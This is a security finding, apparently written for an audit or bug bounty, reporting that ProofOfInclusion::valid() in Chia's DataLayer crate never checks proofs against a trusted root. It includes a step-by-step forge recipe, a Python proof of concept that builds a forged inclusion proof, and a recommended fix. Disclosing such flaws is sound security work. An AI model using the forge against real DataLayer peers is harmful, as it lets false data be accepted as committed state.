### Title
`ProofOfInclusion::valid()` Final Root-Hash Check Is a Tautology — Forged Inclusion Proofs Always Pass - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer crate contains an incomplete validation analogous to the reported `isIncreasing()` bug: it verifies only the internal chain consistency of the proof layers but its final root-hash check is a mathematical tautology, meaning it never actually verifies the proof against any external trusted root. An attacker can construct a `ProofOfInclusion` for an arbitrary `node_hash` that passes `valid()` unconditionally.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← set to last combined_hash
    }

    existing_hash == self.root_hash()      // ← always true (tautology)
}
```

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← same value existing_hash was just set to
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash` holds the last `calculated_hash`, which was already asserted equal to `layer.combined_hash` inside the loop body. `root_hash()` returns that same `last.combined_hash`. Therefore `existing_hash == self.root_hash()` is **always `true`** when `layers` is non-empty — the check is a tautology and provides zero security.

The function only verifies that each layer's `combined_hash` is correctly computed from the previous hash and the sibling hash. It never verifies that the resulting root matches any external trusted tree root. The `root_hash()` value is derived entirely from attacker-controlled proof data.

**Forge recipe (single-layer proof for any claimed `node_hash` H):**

1. Choose arbitrary `node_hash = H`, `other_hash = O`, `other_hash_side = S`
2. Compute `combined_hash = calculate_internal_hash(H, S, O)`
3. Construct `ProofOfInclusion { node_hash: H, layers: [ProofOfInclusionLayer { other_hash_side: S, other_hash: O, combined_hash }] }`
4. `valid()` returns `true`; `root_hash()` returns the attacker-chosen `combined_hash`

The struct is `Streamable` and fully exposed via Python bindings (`from_bytes`, `valid`, `root_hash`), making it trivially reachable from untrusted network input in DataLayer sync flows.

### Impact Explanation

Any DataLayer verifier that receives a `ProofOfInclusion` from an untrusted peer and calls `valid()` — trusting the result as proof of inclusion — can be deceived into accepting a forged proof for any `node_hash` the attacker chooses. Because `valid()` is named to imply complete validation, callers are likely to omit the separate `proof.root_hash() == trusted_root` check. This allows an attacker to prove false inclusion of arbitrary key-value pairs in a DataLayer Merkle tree, corrupting the verifier's view of committed state.

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."**

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` type exposed via Python bindings with `from_bytes()` and `valid()`. DataLayer delta-sync receives serialized proofs from peers. The misleading name `valid()` strongly encourages callers to treat a `true` return as a complete proof of inclusion without a separate root check. The forge requires only arithmetic — no key material, no privileged access.

### Recommendation

The `valid()` method should accept a trusted root hash as a parameter and verify against it, or the tautological final check should be replaced with a real external root comparison:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // ← compare against external trusted root
}
```

All call sites that currently call `valid()` on externally-received proofs must be updated to supply the known trusted tree root.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
from hashlib import sha256

# Attacker wants to forge a proof that node_hash H is in the tree
H = bytes([0xAA] * 32)   # arbitrary claimed node hash
O = bytes([0xBB] * 32)   # arbitrary sibling hash
side = 1                  # Right

# compute combined_hash = sha256(b"\x02" + H + O)
combined = sha256(b"\x02" + H + O).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=side,
    other_hash=O,
    combined_hash=combined,
)
proof = ProofOfInclusion(node_hash=H, layers=[layer])

assert proof.valid()          # True — forged proof passes
assert proof.root_hash() == combined  # attacker-controlled root
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L31-58)
```rust
impl ProofOfInclusion {
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }

    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L57-62)
```rust
pub fn calculate_internal_hash(hash: &Hash, other_hash_side: Side, other_hash: &Hash) -> Hash {
    match other_hash_side {
        Side::Left => internal_hash(other_hash, hash),
        Side::Right => internal_hash(hash, other_hash),
    }
}
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1542-1548)
```rust
    #[pyo3(name = "get_proof_of_inclusion")]
    pub fn py_get_proof_of_inclusion(
        &self,
        key: KeyId,
    ) -> PyResult<proof_of_inclusion::ProofOfInclusion> {
        Ok(self.get_proof_of_inclusion(key)?)
    }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```
